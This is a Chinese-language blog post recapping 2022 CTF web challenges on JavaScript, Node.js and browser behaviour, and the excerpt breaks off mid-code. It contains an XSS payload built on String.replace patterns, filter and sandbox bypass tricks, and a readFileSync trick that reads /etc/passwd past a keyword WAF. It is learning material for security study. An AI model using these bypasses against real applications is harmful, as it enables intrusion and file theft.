<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="zh-tw">
<head>
    <meta charset="utf-8">
<title>2022 年 CTF Web 前端與 JS 題總結 - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">



            
<link href="https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/" rel="alternate" hreflang="en" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2022/12/26/ctf-2022-web-js-summary/">
    





    <meta name="description" content="今年認真跟著 Water Paddler 打了一整年的 CTF，看到有人整理出了一篇 CTF: Best Web Challenges 2022，發現裡面的題目大多數我都有打過，就想說那不如我來寫一篇整理吧，整理一下我自己打過覺得有學到新東西的題目。 因為個人興趣，所以會特別記下來的題目都跟前端與 JS 相關，像是其他有關於後端（PHP、Java 等等）的我就沒記了。 另外，這題有紀錄到的技巧或解">
<meta property="og:type" content="article">
<meta property="og:title" content="2022 年 CTF Web 前端與 JS 題總結">
<meta property="og:url" content="https://blog.huli.tw/2022/12/26/ctf-2022-web-js-summary/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="今年認真跟著 Water Paddler 打了一整年的 CTF，看到有人整理出了一篇 CTF: Best Web Challenges 2022，發現裡面的題目大多數我都有打過，就想說那不如我來寫一篇整理吧，整理一下我自己打過覺得有學到新東西的題目。 因為個人興趣，所以會特別記下來的題目都跟前端與 JS 相關，像是其他有關於後端（PHP、Java 等等）的我就沒記了。 另外，這題有紀錄到的技巧或解">
<meta property="og:locale" content="zh_TW">
<meta property="og:image" content="https://blog.huli.tw/img/ctf-2022-web-js-summary/cover.png">
<meta property="article:published_time" content="2022-12-26T12:10:44.000Z">
<meta property="article:modified_time" content="2023-05-07T01:15:16.477Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/ctf-2022-web-js-summary/cover.png">



<link rel="alternative" href="/atom.xml" title="2022 年 CTF Web 前端與 JS 題總結" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/archives">文章列表</a>
            
            <a class="navbar-item "
               href="/categories">分類</a>
            
            <a class="navbar-item "
               href="/recommend">推薦閱讀</a>
            
            <a class="navbar-item "
               href="/about">關於我</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="目錄">
                    目錄
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#js-相關知識">1&nbsp;&nbsp;<b>JS 相關知識</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#dicectf-2022-no-cookies">1.1&nbsp;&nbsp;DiceCTF 2022 - no-cookies</a>
                    
                    
                    
                    <a class="navbar-item" href="#plaidctf-2022-yaca">1.2&nbsp;&nbsp;PlaidCTF 2022 - YACA</a>
                    
                    
                    
                    <a class="navbar-item" href="#ångstromctf-2022-caasio-pse">1.3&nbsp;&nbsp;ångstromCTF 2022 - CaaSio PSE</a>
                    
                    
                    
                    <a class="navbar-item" href="#googlectf-2022-horkos">1.4&nbsp;&nbsp;GoogleCTF 2022 - HORKOS</a>
                    
                    
                    
                    <a class="navbar-item" href="#corctf-2022-sbxcalc">1.5&nbsp;&nbsp;corCTF 2022 - sbxcalc</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#nodejs-相關">2&nbsp;&nbsp;<b>Node.js 相關</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#dicectf-2022-undefined">2.1&nbsp;&nbsp;DiceCTF 2022 - undefined</a>
                    
                    
                    
                    <a class="navbar-item" href="#corctf-2022-simplewaf">2.2&nbsp;&nbsp;corCTF 2022 - simplewaf</a>
                    
                    
                    
                    <a class="navbar-item" href="#balsn-ctf-2022-2linenodejs">2.3&nbsp;&nbsp;Balsn CTF 2022 - 2linenodejs</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#xsleaks">3&nbsp;&nbsp;<b>XSleaks</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#dicectf-2022-carrot">3.1&nbsp;&nbsp;DiceCTF 2022 - carrot</a>
                    
                    
                    
                    <a class="navbar-item" href="#tsj-ctf-2022-nim-notes">3.2&nbsp;&nbsp;TSJ CTF 2022 - Nim Notes</a>
                    
                    
                    
                    <a class="navbar-item" href="#ångstromctf-2022-sustenance">3.3&nbsp;&nbsp;ångstromCTF 2022 - Sustenance</a>
                    
                    
                    
                    <a class="navbar-item" href="#justctf-2022-ninja">3.4&nbsp;&nbsp;justCTF 2022 - Ninja</a>
                    
                    
                    
                    <a class="navbar-item" href="#sekaictf-2022-safelist">3.5&nbsp;&nbsp;SekaiCTF 2022 - safelist</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#前端-domx2fbom-相關知識">4&nbsp;&nbsp;<b>前端 DOM/BOM 相關知識</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#dicectf-2022-shadow">4.1&nbsp;&nbsp;DiceCTF 2022 - shadow</a>
                    
                    
                    
                    <a class="navbar-item" href="#line-ctf-2022-haribote-secure-note">4.2&nbsp;&nbsp;LINE CTF 2022 - Haribote Secure Note</a>
                    
                    
                    
                    <a class="navbar-item" href="#m0lecon-ctf-2022-ptmd">4.3&nbsp;&nbsp;m0leCon CTF 2022 - ptMD</a>
                    
                    
                    
                    <a class="navbar-item" href="#corctf-2022-modernblog">4.4&nbsp;&nbsp;corCTF 2022 - modernblog</a>
                    
                    
                    
                    <a class="navbar-item" href="#hitcon-ctf-2022-self-destruct-message">4.5&nbsp;&nbsp;HITCON CTF 2022 - Self Destruct Message</a>
                    
                    
                    
                    <a class="navbar-item" href="#sekaictf-2022-obligatory-calc">4.6&nbsp;&nbsp;SekaiCTF 2022 - Obligatory Calc</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#瀏覽器內部運作相關">5&nbsp;&nbsp;<b>瀏覽器內部運作相關</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#googlectf-2022-postviewer">5.1&nbsp;&nbsp;GoogleCTF 2022 - POSTVIEWER</a>
                    
                    
                    
                    <a class="navbar-item" href="#uiuctf-2022-modernism">5.2&nbsp;&nbsp;UIUCTF 2022 - modernism</a>
                    
                    
                    
                    <a class="navbar-item" href="#uiuctf-2022-precisionism">5.3&nbsp;&nbsp;UIUCTF 2022 - precisionism</a>
                    
                    
                    
                    <a class="navbar-item" href="#seccon-ctf-2022-quals-spanote">5.4&nbsp;&nbsp;SECCON CTF 2022 Quals - spanote</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#特別加映人物介紹">6&nbsp;&nbsp;<b>特別加映：人物介紹</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#總結">7&nbsp;&nbsp;<b>總結</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
                
                <i class="fab fa-medium"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
                
                <i class="fab fa-facebook"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-ch.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
                <a class="navbar-item" href="/2022/12/26/en/ctf-2022-web-js-summary/">English</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        最近開了一個讀者回饋表單，無論是對文章的感想或是對部落格的感想，有什麼想回饋的都可以填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            2022 年 CTF Web 前端與 JS 題總結
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-12-26T12:10:44.000Z" itemprop="datePublished">2022年12月26日</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/categories/Security/">Security</a>
        </span>
        
        
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>今年認真跟著 Water Paddler 打了一整年的 CTF，看到有人整理出了一篇 <a target="_blank" rel="noopener" href="https://blog.arkark.dev/2022/12/17/best-web-challs/">CTF: Best Web Challenges 2022</a>，發現裡面的題目大多數我都有打過，就想說那不如我來寫一篇整理吧，整理一下我自己打過覺得有學到新東西的題目。</p>
<p>因為個人興趣，所以會特別記下來的題目都跟前端與 JS 相關，像是其他有關於後端（PHP、Java 等等）的我就沒記了。</p>
<p>另外，這題有紀錄到的技巧或解法不代表第一次出現在 CTF 上，只是我第一次看到或是覺得值得紀錄，就會寫下來。</p>
<p>我把題目分成幾個類別：</p>
<ol>
<li>JS 相關知識</li>
<li>Node.js 相關</li>
<li>XSLeaks</li>
<li>前端 DOM&#x2F;BOM 相關知識</li>
<li>瀏覽器內部運作相關</li>
</ol>
<span id="more"></span>

<h2><span id="js-相關知識">JS 相關知識</span></h2><h3><span id="dicectf-2022-no-cookies">DiceCTF 2022 - no-cookies</span></h3><p>這題的重點在於有一段程式碼的概念大概是這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> pwd <span class="token operator">=</span> <span class="token function">prompt</span><span class="token punctuation">(</span><span class="token string">'input password'</span><span class="token punctuation">)</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[^$']+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>pwd<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span>
  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.note'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> xssPayload
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最後一行你有一個 DOM-based XSS，但你要偷的 pwd 是在 block 裡面，怎麼想都不可能存取到這一段。</p>
<p>而關鍵是那個看似不起眼的 RegExp，有個神奇的屬性叫做 <code>RegExp.input</code> 會把上次 test 的東西記起來，因此拿這個就可以拿到 pwd。</p>
<p>詳細 writeup：<a href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webno-cookies5-solves">https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webno-cookies5-solves</a></p>
<h3><span id="plaidctf-2022-yaca">PlaidCTF 2022 - YACA</span></h3><p>題目核心概念類似這樣（不過我記得是非預期解就是了）：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> tmpl <span class="token operator">=</span> <span class="token string">'&lt;input type="submit" value="&#123;&#123;value&#125;&#125;">'</span>
<span class="token keyword">var</span> value <span class="token operator">=</span> <span class="token function">prompt</span><span class="token punctuation">(</span><span class="token string">'your payload'</span><span class="token punctuation">)</span>
value <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[>"]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
tmpl <span class="token operator">=</span> tmpl<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'&#123;&#123;value&#125;&#125;'</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> tmpl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>&gt;&quot;</code> 都被取代掉了，看似不可能跳脫出屬性，但重點是 tmpl replace 的參數是可以控制的，此時可以利用 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement">special replacement pattern</a> 來找回你的 tag：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> tmpl <span class="token operator">=</span> <span class="token string">'&lt;input type="submit" value="&#123;&#123;value&#125;&#125;">'</span>
<span class="token keyword">var</span> value <span class="token operator">=</span> <span class="token string">"$'&lt;style onload=alert(1) "</span>
value <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[>"]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
tmpl <span class="token operator">=</span> tmpl<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'&#123;&#123;value&#125;&#125;'</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>tmpl<span class="token punctuation">)</span>
<span class="token comment">// &lt;input type="submit" value="">&lt;style onload=alert(1) "></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>完整 writeup：<a href="https://blog.huli.tw/2022/04/14/javascript-string-regexp-magic/">https://blog.huli.tw/2022/04/14/javascript-string-regexp-magic/</a></p>
<h3><span id="ångstromctf-2022-caasio-pse">ångstromCTF 2022 - CaaSio PSE</span></h3><p>簡單來說就是用 <code>with()</code> 來繞過不能用 <code>.</code> 的限制</p>
<p>完整 writeup：<a href="https://blog.huli.tw/2022/05/05/angstrom-ctf-2022-writeup/#misccaasio-pse">https://blog.huli.tw/2022/05/05/angstrom-ctf-2022-writeup/#misccaasio-pse</a></p>
<h3><span id="googlectf-2022-horkos">GoogleCTF 2022 - HORKOS</span></h3><p>這題我會稱之為「JS 反序列化」，簡單來說就是 JS 裡面也有一些 magic method，會偷偷被執行到。</p>
<p>例如說你在 async function return 一個東西時，如果這個東西是 Promise，就會先解析完才回傳，所以 <code>then</code> 就會偷偷被呼叫到。</p>
<p>同理，一些隱式的型別轉換也會呼叫到 <code>toString</code> 或是 <code>valueOf</code>，轉成 JSON 時也會呼叫 <code>toJSON</code> 之類的。</p>
<p>完整 writeup：<a href="https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#horkos-10-solves">https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#horkos-10-solves</a></p>
<h3><span id="corctf-2022-sbxcalc">corCTF 2022 - sbxcalc</span></h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">flag</span><span class="token operator">:</span> window<span class="token punctuation">.</span>flag <span class="token operator">||</span> <span class="token string">'flag'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
  <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token string">'nope'</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>要如何拿到被 Proxy 保護住的原始物件？</p>
<p>答案是 <code>Object.getOwnPropertyDescriptor(p, &#39;flag&#39;)</code></p>
<p>writeup：<br><a href="https://blog.huli.tw/2022/12/08/ctf-js-notes/#corctf-2022-sbxcalc">https://blog.huli.tw/2022/12/08/ctf-js-notes/#corctf-2022-sbxcalc</a></p>
<h2><span id="nodejs-相關">Node.js 相關</span></h2><h3><span id="dicectf-2022-undefined">DiceCTF 2022 - undefined</span></h3><p>這題核心大概是這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
<span class="token keyword">delete</span> global<span class="token punctuation">.</span>global<span class="token punctuation">;</span>
process <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> __dirname<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Int8Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
  <span class="token comment">// ... 省略一大堆 undefined</span>
  
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>基本上就是先把所有東西變成 <code>undefined</code>，最後會用 <code>eval</code> 執行你傳進去的程式碼。雖然你可以跑任何東西，但因為所有東西都變成 <code>undefined</code> 了，你沒什麼能做的。</p>
<p>解法有三個：</p>
<ol>
<li><code>import()</code>，這個沒被刪掉</li>
<li>用 <code>arguments.callee.caller.arguments</code> 可以拿到上層被覆蓋掉的 arguments（Node.js 自動幫你包的一層）</li>
<li>用 try catch 可以拿到 Error 的 instance</li>
</ol>
<p>詳細 writeup: <a href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#miscundefined55-solves">https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#miscundefined55-solves</a></p>
<h3><span id="corctf-2022-simplewaf">corCTF 2022 - simplewaf</span></h3><p>這題的核心是這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">[</span>req<span class="token punctuation">.</span>body<span class="token punctuation">,</span> req<span class="token punctuation">.</span>headers<span class="token punctuation">,</span> req<span class="token punctuation">.</span>query<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">some</span><span class="token punctuation">(</span>
    <span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> item <span class="token operator">&amp;&amp;</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"bad hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>file <span class="token operator">||</span> <span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>你可以控制 <code>req.query.file</code> 但是不能包含 <code>flag</code> 這個字，目標是讀到 <code>/app/flag.txt</code> 這個檔案。</p>
<p>這題需要去看 <code>fs.readFileSync</code> 的內部實作，會發現可以傳入一個長得很像 URL instance 的物件，就會用 new URL() 去讀，就可以用 URL encode 繞過了：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">href</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  <span class="token literal-property property">origin</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  <span class="token literal-property property">protocol</span><span class="token operator">:</span> <span class="token string">'file:'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">hostname</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
  <span class="token literal-property property">pathname</span><span class="token operator">:</span> <span class="token string">'/etc/passw%64'</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">// 等同於 readFileSync(new URL("file:///etc/passw%64"))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>作者 writeup：<a target="_blank" rel="noopener" href="https://brycec.me/posts/corctf_2022_challenges#simplewaf">https://brycec.me/posts/corctf_2022_challenges#simplewaf</a></p>
<h3><span id="balsn-ctf-2022-2linenodejs">Balsn CTF 2022 - 2linenodejs</span></h3><p>程式碼核心長這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token hashbang comment">#!/usr/local/bin/node</span>
process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'readable'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> json <span class="token operator">=</span> process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\?(.*?)\ </span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">?.</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    obj <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">JSON: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>json<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, Object:</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./index'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./usage'</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">finally</span><span class="token punctuation">&#123;</span>
    process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// index</span>
module<span class="token punctuation">.</span><span class="token function-variable function">exports</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token parameter"><span class="token constant">O</span><span class="token punctuation">,</span>o</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>
    Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token constant">O</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>
        <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">[</span><span class="token constant">K</span><span class="token punctuation">,</span><span class="token constant">V</span><span class="token punctuation">]</span></span><span class="token punctuation">)</span><span class="token operator">=></span>Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token constant">V</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>
            <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">[</span>k<span class="token punctuation">,</span>v<span class="token punctuation">]</span></span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span>o<span class="token punctuation">[</span><span class="token constant">K</span><span class="token punctuation">]</span><span class="token operator">=</span>o<span class="token punctuation">[</span><span class="token constant">K</span><span class="token punctuation">]</span><span class="token operator">||</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>o<span class="token punctuation">[</span><span class="token constant">K</span><span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">=</span>v<span class="token punctuation">)</span>
